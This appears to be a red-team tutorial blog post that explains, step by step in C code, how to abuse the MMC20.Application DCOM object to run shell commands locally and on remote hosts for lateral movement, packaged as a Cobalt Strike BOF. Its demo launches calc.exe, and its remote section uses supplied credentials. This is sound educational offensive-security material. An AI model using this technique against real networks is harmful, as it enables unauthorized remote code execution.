# Exploiting (D)COM in C; CobaltStrike BOF as PoC.
As a junior Redteamer I wanted to learn more about (D)COM. Turned out that mostly (D)COM is abused using Powershell, C#, and C++. Now, it is possible to write a BOF using C++ but I thought it will be more interesting if I try C, and it worked! We will use MMC20.Application in the demo although the PoC uses ShellWindows. This is intentional because the concepts cannot be all explained in one PoC. If you go through this article, understanding the PoC should not be a difficult task.
The COM Basics together with a demo is covered in a YouTube video (TBD). 



## General Workflow
1.  Initialize COM
2.  Find the CLSID for MMC20.Application class
3.  Find the IID for the interface that declares the method we want to invoke
4.  Create an instance (object) of the MMC20.Application class
5.  Get a pointer to the interface implementing the method you want to invoke
6.  Get the ID of the method you want to invoke
7.  Invoke it

Let's break them down one at a time...

### 1.  Initialize COM
This is pretty much standard. The function to use is `CoInitialize`, and NULL must be passed as an argument for it. You may also use `CoInitializeEx`, but `CoInitialize` will do.
```C
HRESULT hr = CoInitialize(NULL);
```

### 2.  Find the CLSID for MMC20.Application class
There are many ways to find the CLSID for a given class. The easiest way is to use Google. You can also find a CLSID programmatically using CLSIDFromProgID function.
```C
CLSID clsid;
hr =  CLSIDFromProgID( L"MMC20.Application", &clsid);
```
Another way to find the CLSID is using OleView .NET from James Forshaw. It is an excellent tool to inspect COM objects. You can explore ProgIDs and filter for MMC20 and copy the GUID. This tool has by no doubt much more to offer than just copying GUIDs.

![Finding-CLSID](https://raw.githubusercontent.com/Yaxser/CobaltStrike-BOF/gh-pages/images/MMC20CLSID.png)

Now, if you obtain the GUID as a string, you have to convert it to a CLSID using CLSIDFromString. Note the curly brackets, they are necessary.

```C
wchar_t *MMC20_CLSID = L"{49B2791A-B1AE-4C90-9B8E-E860BA07F889}";
CLSID clsid;
hr = CLSIDFromString(MMC20_CLSID, &clsid);
```




### 3.  Finding the IID's
Finding IID’s is not so different from finding CLSID’s, lucky us. However, sometimes the tricky part is to find the right interface. What we want to do is porting the following line to C.
```powershell
$obj.Document.ActiveView.ExecuteShellCommand('cmd',$null,'/c calc.exe','7')
```
A good place to start is `OleView .NET.` Let’s see which interfaces are exposed in the MMC20.Application class. The supported interfaces tab will show you which interfaces are exposed by MMC20.Application class. 

![Finding-IIDs](https://raw.githubusercontent.com/Yaxser/CobaltStrike-BOF/gh-pages/images/supported_ifc.png)

As you can see, the `Document` and `ActiveView` are not present so we cannot access their methods directly. So what and where are they? It turned out that the Document and ActiveView interfaces are stored as properties. Actually, ActiveView is not the name of the interface. The name of the interface is `View`, as you can see below. We already established that these interfaces are not accessible directly, so we need to retrieve them as properties. The `Document` property is stored inside the `Application` interface, and the `ActiveView` (i.e. `View` interface) property is stored inside `Document` the document interface. So, the interface we would like to retrieve first is the `Application` interface. From there, we will get access to the Document and View interfaces without needing their IID. 

![IIDsAsProperties](https://raw.githubusercontent.com/Yaxser/CobaltStrike-BOF/gh-pages/images/Application_ifc.png)


The IID for the application interface is also shown on the previous picture, so let's copy it to our code.

```C
IID ApplicationIID;
hr = IIDFromString(L"{A3AFB9CC-B653-4741-86AB-F0470EC1384C}", &ApplicationIID);
```

### 4.  Create The Instance
Now that we have the CLSID and IID we need, we can create an instance of the MMC20.Application class using the following arguments:
1.	The CLSID for the MMC20.Application
2.	This is almost always NULL
3.	The class context. OleView .NET shows the class context under the properties tab (picture below).
4.	The IID of the interface we are interested in. If we have multiple interfaces that we want to interact with, we use **one** `CoCreateInstance` and multiple QueryInterface calls.
5.	A pointer to a variable where we want our object to be stored. We can pass a variable of type IDispatch since the application interface inherits from IDispatch.

![CLSCTX](https://raw.githubusercontent.com/Yaxser/CobaltStrike-BOF/gh-pages/images/CLSCTX.png)

```C
IDispatch *ApplicationIfc;
hr = CoCreateInstance(&clsid, NULL, CLSCTX_LOCAL_SERVER, &ApplicationIID, (void**)&ApplicationIfc);
```
If this call succeeded, we will retrieve an MMC20.Application object that allows us to access the Application interface via `ApplicationIfc`.


### 5. Getting the pointers to Document and View interfaces 
The call to `CoCreateInstance` stored a pointer to the Application interface in the `ApplicationIfc` variable. Now, we will use this pointer to retrieve the `Document` property. The document property is actually an interface, but since it is not exposed to us, we cannot use the typical (`QueryInterface`) method to retrieve it. However, we can retrieve it using the method named `Document` from the application interface, which will store a pointer to the Document interface in the pointer we pass to it. The picture from the OleView (by Microsoft) shows the prototype for that function.

![DocumentIfc](https://raw.githubusercontent.com/Yaxser/CobaltStrike-BOF/gh-pages/images/Document.png)

To invoke a specific method, we need to have its Dispatch ID (DISPID), which highlighted in pink on the picture. The DISPID is just a unqiue identifier for each method, and it can be hardcoded in our code. We can invoke a method from an interface using its invoke `method`. The invoke method is present on all interfaces that implement the IDispatch interface. The arguments are the following

1.	Pointer to ‘this’, a pointer to the interface itself
2.	The target method DISPID. We know from OleView that it is 4
3.	This is reserved by Microsoft, always `IID_NULL`
4.	Language preference, almost always `LOCALE_SYSTEM_DEFAULT`
5.	The operation type, we want to get a property so it is `DISPATCH_PROPERTYGET`
6.	In case you have parameters to pass to the function, we will go through that pain later, now we just pass NULL
7.	In case the function you are invoking is returning anything. The VARIANT struct can accommodate many different types of values, including an interface. This will be populated with the Document interface in our case
8.	If the function invoked threw an exception, you can see the exception details. However, for our purpose we can just pass NULL
9.	In case of an error, we can also ignore it.

If you are not sure what the lpVtbl is, please watch the video companion for this article :D

```C
DISPPARAMS dp = { NULL, NULL, 0, 0 }; 
VARIANT* vDocIfc = (VARIANT*)malloc(sizeof(VARIANT));
hr = ApplicationIfc->lpVtbl->Invoke(ApplicationIfc, (LONG)4, &IID_NULL, LOCALE_SYSTEM_DEFAULT, DISPATCH_PROPERTYGET, &dp, vDocIfc, NULL, 0);

if(!SUCCEEDED(hr)){
//error handling
}
ApplicationIfc->lpVtbl->Release(ApplicationIfc); //We must release whatever we acquire to keep the system clean. If you will return during the error handling, don't forget to invoke release before you return!
```

The `VARIANT` type has two members. The first member is `vt`, which identifies the *v*ariant *t*ype, and the second member is the variant itself. So, in our case the first member (vt) will be `VT_DISPATCH`, and the second member will be `pdispVal` (pointer to IDispatch interface, in our case the Document interface). In other words, our document interface will be now located at `vDocIfc->pdispVal`.

Now that we have obtained a pointer to the document interface, let’s obtain a pointer to the View interface. The call is identical to the previous one, we just change the variables. But… what if we did not want to hardcode the method dispatch ID? What if we knew that we wanted to call a function named ActiveView but did not want to open OleView to find its number? Easy. If we know the name of the method, we can use the function `GetIDsOfNames()` to retrieve its dispatch ID.

![ViewIfc](https://raw.githubusercontent.com/Yaxser/CobaltStrike-BOF/gh-pages/images/View2.bmp)


```C
VARIANT* vViewIfc = (VARIANT*)malloc(sizeof(VARIANT));
BSTR szMember = SysAllocString(L"ActiveView");
DISPID dpid;
hr = vDocIfc->pdispVal->lpVtbl->GetIDsOfNames(vDocIfc->pdispVal, &IID_IDispatch, &szMember, 1, LOCALE_SYSTEM_DEFAULT, &dpid);
hr = vDocIfc->pdispVal->lpVtbl->Invoke(vDocIfc->pdispVal,dpid, &IID_NULL, LOCALE_SYSTEM_DEFAULT, DISPATCH_PROPERTYGET, &dp, vViewIfc, NULL, 0);

if(!SUCEEDED(hr)){
//error handling, don't forget to release vDocIfc if you are returning
}

hr = vDocIfc->pdispVal->lpVtbl->Release(vDocIfc->pdispVal);
```

### 6. Get the ID of the member you want to invoke
We know how to do that, we can do it via the GUI or programatically. If you do it via the GUI, please keep in mind that the values you are looking at are HEX values, you need to convert them to DECIMAL before you can use them. The decimal value of ExecuteShellCommand is `54`.


### 7. Invoking our method
So, now that we have obtained the ActiveView property (which nothing but a pointer to the View interface), we can use it to invoke our method of interest: ExecuteShellCommand. We’ve invoked two methods already and the third is quite similar. However, the difference is that now we want to pass string arguments to that method. The prototype of ExecuteShellCommand can be found under the View interface.

![ExecShellCommand](https://raw.githubusercontent.com/Yaxser/CobaltStrike-BOF/gh-pages/images/ExecShell.png)

Passing arguments to a COM object in C is not enjoyable. The parameters should be passed in one structure type named `DISPPARAMS`. Let’s take look at its prototype


```C
typedef struct tagDISPPARAMS { VARIANTARG *rgvarg; DISPID     *rgdispidNamedArgs; UINT       cArgs; UINT       cNamedArgs; } DISPPARAMS;
```
In English, we need to pass an array of VARIANT’s (`rgvarg`), each variant contains one argument to the method we want to call and we need to give the count of these variants (`cArgs`). I did not manage to understand what `rgdispidNamedArgs` is used for, but we can safely assign a zero to it and to `cNamedArgs`. So, let’s create our arguments. The `SysAllocString` will take our string and convert it to BSTR, which is the only string type that should be passed to any function we invoke.

```C
VARIANT vCmd;
vCmd.vt = VT_BSTR;
vCmd.bstrVal = SysAllocString(L"c:\\windows\\system32\\cmd.exe");

VARIANT vDir;
vDir.vt = VT_BSTR;
vDir.bstrVal = SysAllocString(L"");


VARIANT vArgs;
vArgs.vt = VT_BSTR;
vArgs.bstrVal = SysAllocString(L"/c calc.exe");

VARIANT vShow;
vShow.vt = VT_BSTR;
vShow.bstrVal = SysAllocString(L"Minimized");
```
Now that we have our variables to the original function created, let’s add them to the a `DISPPARAMS` variable. 

```C
DISPPARAMS params = { NULL, NULL, 0, 0 };
//Add the variants we created to the params.
params.rgvarg = (VARIANT*)malloc(sizeof(VARIANT)*4);
VARIANT varr[4] = {vShow, vArgs, vDir, vCmd };
params.rgvarg = varr;
params.cArgs = 4;

//This will work
params.rgdispidNamedArgs = 0;
params.cNamedArgs = 0;

```

If you have a sharp eye and did not lose your focus yet, you should've noticed that the arges in `varr` are in reversed order (i.e. prototype takes command first but here we are passing command as the last arg). This is just the way it is.

Now that we have our all of our arguments in place, we can use the invoke the ExecuteShellCommand function in the same way we invoked the Document and View functions. This will popup a calculator for us. Remember that (vViewIfc->pdispVal) is nothing but the ActiveView property. So we are now finally invoking the ExecuteShellCommand of ActiveView.

```C
VARIANT res;
hr = vViewIfc->pdispVal->lpVtbl->Invoke(vViewIfc->pdispVal, (LONG)54, &IID_NULL, LOCALE_SYSTEM_DEFAULT, DISPATCH_METHOD, &params, &res, NULL, 0);

if(!SUCEEDED(hr)){
//error handling, don't forget to release vViewIfc if you are returning
}
vViewIfc->pdispVal->lpVtbl->Release(vViewIfc->pdispVal);
```

## Lateral Movement Using DCOM
This example will work on a remote computer with some simple changes. We need to call CoCreateInstanceEx instead of CoCreateInstance. That’s it? Yes. However, CoCreateInstanceEx expects more parameters to know how to connect to the remote server. So, we specify who’s the target, what authentication we are going to use, and which identity we are going to authenticate with. This means we have to fill in three different structures: `COSERVERINFO`, `COAUTHINFO`, `COAUTHIDENTITY`. Compared to the DISPARAMS, filling them is trivial. In addition, the way we tell the remote server where to store the pointer to object is slightly different. 

Let’s start first with the user we want to use. This assumes that you are trying to impersonate another user. If not, skip to the next structure because this one can be NULL.

```C
COAUTHIDENTITY* authidentity = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(COAUTHIDENTITY));
authidentity->User = L"?USERNAME";
authidentity->Password = L"?PASSWORD";
authidentity->Domain = L"?DOMAIN";
authidentity->UserLength = wcslen(authidentity->User);
authidentity->PasswordLength = wcslen(authidentity->Password);
authidentity->DomainLength = wcslen(authidentity->Domain);
authidentity->Flags = SEC_WINNT_AUTH_IDENTITY_UNICODE;
```

Now, we can fill in how we want to authenticate. Note that most of these are just constants provided by MS. The only variable here is the authidentity struct that we filled in the previous step. If you want to to use the current user context, just pass NULL to pAuthIdentityData.

```C
COAUTHINFO* authInfo = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(COAUTHINFO));
authInfo->dwAuthnSvc = RPC_C_AUTHN_WINNT;
authInfo->dwAuthzSvc = RPC_C_AUTHZ_NONE;
authInfo->pwszServerPrincName = NULL;
authInfo->dwAuthnLevel = RPC_C_AUTHN_LEVEL_DEFAULT;
authInfo->dwImpersonationLevel = RPC_C_IMP_LEVEL_IMPERSONATE;
authInfo->pAuthIdentityData = authidentity;
authInfo->dwCapabilities = EOAC_NONE;
```
Finally, we fill in the server info. Note that pwszName can take a hostname or a host IP.

```C
COSERVERINFO* srvinfo = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(COSERVERINFO));;
srvinfo->dwReserved1 = 0;
srvinfo->dwReserved2 = 0;
srvinfo->pwszName = L"10.1.1.1";
srvinfo->pAuthInfo = authInfo;
```

Now, how do we receive an object that we can interact with from the server? Well, we have to provide the server with something in which it can store the object pointer for us. This is the MULTI_QI struct. The server will receive a MULTI_QI struct from us containing three members. The first member is the IID of the interface we want to retrieve (in this case, we want to retrieve the application interface). The second member must be NULL and on success it will contain a pointer to the interface we requested. The last member is an HRESULT that will receive the return value of the `QueryInterface` call to locate the requested interface. So, for example, if after invocation the last member is `E_NOINTERFACE` then the CLSID we provided does not support the interface we asked for. 

```C
MULTI_QI mqi[1] = {&ApplicationIfc, NULL, 0 };
```

Finally, we call the `CoCreateInstanceEx`. The second line shows how we can interact with the returned object if the call succeeded.

```C
CoCreateInstanceEx(&clsid, NULL, CLSCTX_REMOTE_SERVER, srvinfo, 1, mqi);
mqi->pItf->lpVtbl->invoke(ApplicationIfc, (LONG)4, &IID_NULL, LOCALE_SYSTEM_DEFAULT, DISPATCH_PROPERTYGET, &dp, vDocIfc, NULL, 0);
```

## CobaltStrike BOF Considerations
Since this is written in C, it can be ported to a CobaltStrike BOF. The official documentation and the article of TrustedSec is a good place to start with BOF if you are not familiar with the concept. There are some items that you need to consider thought.

1.  Microsoft provides the CLSID’s and IID’s of many COM objects in the header files. However, Beacon showed an “unreferenced symbol” error whenever I tried to use those IID’s. This will be fixed if you define the CLSID’s and IID’s yourself. So you need to do it like the code snippet below even if Microsoft defined CLSID_MMC20Application and the IID IID_IDispatch. 

```C
wchar_t *MMC20_CLSID = L"{49B2791A-B1AE-4C90-9B8E-E860BA07F889}";
CLSID clsid;
hr = CLSIDFromString(clsid_str, &clsid);
IID xIDispatch;
hr = IIDFromString(L"{00020400-0000-0000-C000-000000000046}", &xIDispatch);
hr = vDocIfc->pdispVal->lpVtbl->GetIDsOfNames(vDocIfc->pdispVal, &xIDispatch, &szMember, 1, LOCALE_SYSTEM_DEFAULT, &dpid); //Example invocation using the new IID
```

2.  Using Microsoft compiler (“cl.exe”) did not work for me. I got some weird unresolved symbols from beacon although the object file was compiled successfully
3.  You may run against “unreferenced symbol GUID_NULL” you can use the following line to resolve that
```C
const GUID GUID_NULL = { 0, 0, 0, { 0, 0, 0, 0, 0, 0, 0, 0 } };
```
4.  CobaltSrike BOF support C++, you may want to write your COM BOF using that since it is less error-prone


## Acknowledgement

## References
